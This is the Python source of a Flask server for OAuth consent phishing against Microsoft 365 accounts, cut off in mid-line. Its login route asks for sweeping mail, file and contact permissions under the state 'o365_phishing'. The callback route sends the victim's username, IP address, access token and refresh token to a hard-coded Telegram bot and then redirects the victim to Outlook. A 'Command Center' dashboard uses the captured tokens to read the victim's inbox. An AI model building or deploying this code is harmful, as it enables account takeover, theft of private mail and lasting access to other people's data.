import flask
import requests
import time
import threading
import json
import base64
import os
import io
import html
import logging
from urllib.parse import quote

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = flask.Flask(__name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"
MS_CLIENT_ID = "7115da65-3ffa-4b8b-8fc4-dee1e90c6b8d"
MS_REDIRECT_URI = "https://appsingingfix.onrender.com/callback"
MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send Mail.ReadWrite Calendars.ReadWrite Contacts.ReadWrite Files.Read Files.ReadWrite Sites.Read.All User.Read.All"
MS_TENANT = "common"

# --- TOKEN VAULT ---
TOKEN_VAULT = {}
VAULT_LOCK = threading.Lock()

def _fetch_user_info(access_token):
    try:
        r = requests.get("https://graph.microsoft.com/v1.0/me?$select=displayName,mail,userPrincipalName,jobTitle,companyName", headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        logger.error(f"Failed to fetch user info: {e}")
    return {"displayName": "Unknown", "mail": "unknown@example.com"}

def _refresh_token(refresh_token):
    url = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/token"
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": MS_SCOPE
    }
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            tokens = response.json()
            new_access = tokens["access_token"]
            new_refresh = tokens.get("refresh_token", refresh_token)
            user_info = _fetch_user_info(new_access)
            return new_access, new_refresh, user_info
        else:
            logger.error(f"Token refresh failed: {response.text}")
    except Exception as e:
        logger.error(f"Token refresh exception: {e}")
    return None, None, None

def get_valid_session(refresh_token):
    if not refresh_token:
        return None, None, None
    with VAULT_LOCK:
        session = TOKEN_VAULT.get(refresh_token)
        if session and time.time() - session["last_refresh"] < 3300:
            return session["access_token"], session["user_info"], refresh_token
        
        new_access, new_refresh, user_info = _refresh_token(refresh_token)
        if new_access:
            if new_refresh != refresh_token:
                if refresh_token in TOKEN_VAULT:
                    del TOKEN_VAULT[refresh_token]
                TOKEN_VAULT[new_refresh] = {"access_token": new_access, "user_info": user_info, "last_refresh": time.time()}
                return new_access, user_info, new_refresh
            else:
                TOKEN_VAULT[refresh_token] = {"access_token": new_access, "user_info": user_info, "last_refresh": time.time()}
                return new_access, user_info, refresh_token
        else:
            if session:
                return session["access_token"], session["user_info"], refresh_token
            return None, None, None

def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    message = html.escape(message, quote=False)
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except Exception as e:
        logger.error(f"[TELEGRAM] Error: {e}")

def graph_api(endpoint, method='GET', body=None, params=None, stream=False, token=None):
    access_token, user_info, current_refresh_token = get_valid_session(token)
    if not access_token:
        return {"error": "No active token available"}, 401, current_refresh_token
    url = f"https://graph.microsoft.com/v1.0{endpoint}"
    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
    try:
        response = requests.request(method, url, headers=headers, json=body, params=params, timeout=30, stream=stream)
        if response.status_code >= 400:
            try:
                err_data = response.json()
            except:
                err_data = {"error": response.text}
            return err_data, response.status_code, current_refresh_token
        if stream:
            return response, response.status_code, current_refresh_token
        try:
            data = response.json()
        except:
            data = response.text
        return data, response.status_code, current_refresh_token
    except Exception as e:
        logger.error(f"Graph API Exception: {e}")
        return {"error": str(e)}, 500, current_refresh_token

# --- ROUTES ---

@app.route("/health")
def health_check():
    return {"status": "ok"}, 200

@app.route("/")
def index():
    token = flask.request.args.get('token', '')
    dashboard_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>O365 Command Center</title>
        <style>
            body { font-family: sans-serif; margin: 20px; background: #f4f4f4; }
            .card { background: white; padding: 20px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            h2 { color: #0078d4; }
        </style>
    </head>
    <body>
        <h1>O365 Command Center</h1>
        <div class="card">
            <h2>Status</h2>
            <div id="status">Loading...</div>
        </div>
        <div class="card">
            <h2>Inbox (Latest 5)</h2>
            <div id="inbox">Loading...</div>
        </div>
        <script>
            const token = new URLSearchParams(window.location.search).get('token');
            async function loadStatus() {
                if (!token) { document.getElementById('status').innerText = 'No Token Provided'; return; }
                const res = await fetch(`/api/status?token=${token}`);
                const data = await res.json();
                if (data.active) {
                    document.getElementById('status').innerText = `Active: ${data.user.displayName} (${data.user.mail})`;
                } else {
                    document.getElementById('status').innerText = 'Inactive or Invalid Token';
                }
            }
            async function loadInbox() {
                if (!token) { document.getElementById('inbox').innerText = 'No Token Provided'; return; }
                const res = await fetch(`/api/inbox?token=${token}&top=5`);
                const data = await res.json();
                if (data.value) {
                    document.getElementById('inbox').innerHTML = data.value.map(msg => `<div style="border-bottom:1px solid #eee; padding:5px"><b>${msg.subject || '(No Subject)'}</b><br><small>${msg.receivedDateTime}</small></div>`).join('');
                } else {
                    document.getElementById('inbox').innerText = JSON.stringify(data);
                }
            }
            loadStatus();
            loadInbox();
        </script>
    </body>
    </html>
    """
    return flask.Response(dashboard_html, mimetype='text/html')

@app.route("/login")
def login():
    params = {
        "client_id": MS_CLIENT_ID,
        "response_type": "code",
        "redirect_uri": MS_REDIRECT_URI,
        "scope": MS_SCOPE,
        "state": "o365_phishing"
    }
    url = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/authorize?" + "&".join(f"{k}={quote(str(v))}" for k, v in params.items())
    return flask.redirect(url)

@app.route("/callback")
def callback():
    auth_code = flask.request.args.get('code', '')
    error = flask.request.args.get('error', '')
    ip = flask.request.headers.get('X-Forwarded-For', flask.request.remote_addr)
    if error:
        send_to_telegram(f"❌ <b>Auth Failed</b>\nIP: {ip}\nError: {error}")
        return flask.redirect("https://outlook.office365.com/")
    if not auth_code:
        send_to_telegram(f"❌ <b>Auth Failed</b>\nIP: {ip}\nNo code received")
        return flask.redirect("https://outlook.office365.com/")
    token_url = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/token"
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": MS_REDIRECT_URI,
        "scope": MS_SCOPE
    }
    try:
        response = requests.post(token_url, data=data, timeout=15)
        if response.status_code != 200:
            send_to_telegram(f"❌ <b>Token Exchange Failed</b>\nIP: {ip}\n{response.text}")
            return flask.redirect("https://outlook.office365.com/")
        tokens = response.json()
        username = "Unknown"
        if "id_token" in tokens:
            try:
                payload = tokens["id_token"].split('.')[1]
                padding = 4 - len(payload) % 4
                if padding != 4: payload += '=' * padding
                user_info = json.loads(base64.urlsafe_b64decode(payload))
                username = user_info.get("preferred_username", "Unknown")
            except: pass
        access_token = tokens.get("access_token")
        refresh_token = tokens.get("refresh_token")
        with VAULT_LOCK:
            TOKEN_VAULT[refresh_token] = {
                "access_token": access_token,
                "user_info": {"displayName": username, "mail": username},
                "last_refresh": time.time()
            }
        send_to_telegram(f"""
🛡️ <b>O365 Session Captured</b>
👤 <b>User:</b> {username}
🌐 <b>IP:</b> {ip}
🔑 <b>Access Token:</b>
<code>{access_token}</code>
🔄 <b>Refresh Token:</b>
<code>{refresh_token}</code>
💡 <b>Command Center:</b>
<code>https://{flask.request.host}/?token={refresh_token}</code>
""")
    except Exception as e:
        logger.error(f"Callback exception: {e}")
        send_to_telegram(f"❌ <b>Exception</b>\nIP: {ip}\n{str(e)}")
    return flask.redirect("https://outlook.office365.com/")

@app.route("/api/status")
def api_status():
    token = flask.request.args.get('token', '')
    access, user_info, current_rt = get_valid_session(token)
    if not access or not user_info:
        return flask.jsonify({"active": False, "user": None})
    return flask.jsonify({"active": True, "user": user_info, "refresh_token": current_rt})

@app.route("/api/inbox")
def api_inbox():
    token = flask.request.args.get('token', '')
    top = flask.request.args.get('top', 10)
    query = f"?$top={top}&$orderby=receivedDateTime%20desc&$select=subject,from,receivedDateTime,bodyPreview,isRead,id"
    data, status, _ = graph_api(f"/me
